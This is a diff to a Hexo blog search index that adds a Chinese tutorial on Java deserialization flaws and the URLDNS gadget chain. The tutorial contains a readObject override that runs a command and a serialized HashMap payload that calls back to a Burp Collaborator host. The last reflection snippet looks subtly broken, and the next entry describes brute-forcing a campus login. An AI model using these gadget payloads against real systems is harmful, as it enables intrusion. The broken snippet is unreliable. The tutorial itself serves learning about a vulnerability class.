@@ -1,6 +1,72 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Java反序列化入门及URLDNS链</title>
+    <url>/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/</url>
+    <content><![CDATA[<h1 id="反序列化漏洞学习"><a href="#反序列化漏洞学习" class="headerlink" title="反序列化漏洞学习"></a>反序列化漏洞学习</h1><p>假设有这么个实体类：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person.java</span><br><span class="line"> <span class="comment">//注意要实现一个Serializable接口</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在我们要传递这个对象，假设有两台机器，那么<strong>电脑一</strong>上进行序列化过程</p>
+<h2 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SerializationTest.java</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">30</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用一个文件输出流把对象给序列化了，<strong>电脑二</strong>要读取这个类，那么就要进行反序列化</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">UnSerializeTest.java</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnSerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span><span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行后：</p>
+<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125112310262.png" alt="image-20241125112310262"></p>
+<p>现在就成功拿到了这个类，</p>
+<p>现在要知道，不安全的反序列化有三种情况</p>
+<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125113013995.png" alt="image-20241125113013995"></p>
+<p>比如</p>
+<h3 id="一："><a href="#一：" class="headerlink" title="一："></a>一：</h3><p>现在我们在Person类里如果重写一个readObject，加入一个危险的命令执行，</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在把他序列化后反序列化</p>
+<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125112828285.png" alt="image-20241125112828285"></p>
+<p>会发现执行了命令，但这么危险的类一般不会有人这么写</p>
+<h3 id="二："><a href="#二：" class="headerlink" title="二："></a>二：</h3><p>入口类参数中包含可控类，该类有危险方法，readObject时调用</p>
+<p>实际上这种情况也不是很多</p>
+<h3 id="三："><a href="#三：" class="headerlink" title="三："></a>三：</h3><p>入口类参数包含可控类，该类又调用其他有危险方法的类，readOBject时调用</p>
+<h2 id="反射在反序列化漏洞中的作用"><a href="#反射在反序列化漏洞中的作用" class="headerlink" title="反射在反序列化漏洞中的作用"></a>反射在反序列化漏洞中的作用</h2><ul>
+<li>定制需要的对象</li>
+<li>通过invoke调用除了同名函数以外的函数</li>
+<li>通过Class类创建对象，引入不能序列化的类</li>
+</ul>
+<h2 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h2><p>在上文中已经知道了一个对象只要实现了Serilizable接口，这个对象就可以被序列化</p>
+<p> <code>URLDNS</code> 是知名反序列化工具ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：</p>
+<ul>
+<li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li>
+<li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li>
+<li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li>
+</ul>
+<p>跟进URL类，发现他继承了Serilizable接口，可以进行反序列化，但接着跟下去发现是无法完成序列化的</p>
+<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125135542195.png" alt="image-20241125135542195"></p>
+<p>这里调用了一个handler的hashCode函数,跟进</p>
+<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125141701454.png" alt="image-20241125141701454"></p>
+<p>有一个getHostAddress，根据介绍知道他是一个根据域名获取地址，也就是说如果调用url类的hashCode函数就可以得到一个DNS请求，就可以验证是否存在漏洞</p>
+<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125141958472.png" alt="image-20241125141958472"></p>
+<p>正常来说我们只要把这个hashmap给序列化了，然后在反序列化时就会发送dns请求</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://umkizmypfx2mj6b4ek775od9w02qqf.burpcollaborator.net&quot;</span>),<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但奇怪的是在序列化的时候我们就接收到了请求，而反序列化的时候却没有接收到请求</p>
+<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125143456553.png" alt="image-20241125143456553"></p>
+<p>阅读代码可知：</p>
+<p>如果hashCode不等于-1的话他就直接返回了，而不会继续往下走</p>
+<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125144017786.png" alt="image-20241125144017786"></p>
+<p>hashCode在初始化的时候是-1，但我们在调用put它之后就把值给改变了，</p>
+<p>我们现在不想让他发起请求，我们就要让把URL对象的hashcode改成不是-1，那么就可以通过反射去修改URL的hashcode</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射修改URL的hashCode</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodeField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCodeField.set(url, <span class="number">114514</span>); <span class="comment">// 设置URL的hashCode为114514，只要不是-1都行</span></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在他在序列化的时候就不会发起dns请求了，验证：</p>
+<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125145247862.png" alt="image-20241125145247862"></p>
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p>
+<h1 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h1>]]></content>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>Java安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>校园网登录框前端加密分析</title>
     <url>/2024/11/25/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>尝试对学校校园网登录框进行爆破，发现密码在前端被加密了</p>
